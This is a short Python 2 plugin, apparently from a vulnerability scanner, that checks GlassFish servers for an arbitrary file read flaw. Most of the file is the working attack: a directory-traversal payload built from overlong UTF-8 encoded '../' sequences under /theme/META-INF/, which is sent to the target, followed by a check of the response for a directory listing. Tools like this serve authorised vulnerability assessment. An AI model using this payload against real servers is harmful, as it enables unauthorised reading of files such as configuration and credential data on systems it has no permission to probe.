# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "GlassFish 任意文件读取",
        "info": "可读取服务器上的任意文件",
        "level": "高危",
        "type": "任意文件读取",
        "author": "taro",
        "url": "",
        "keyword": "all:glassfish",
        "source": 1
    }
    return plugin_info


def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/'
    url = u + payload_url
    try:
        res = requests.get(url, timeout=timeout)
        if 'package-appclient.xml' in res.text:
            info = '存在任意文件读取: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
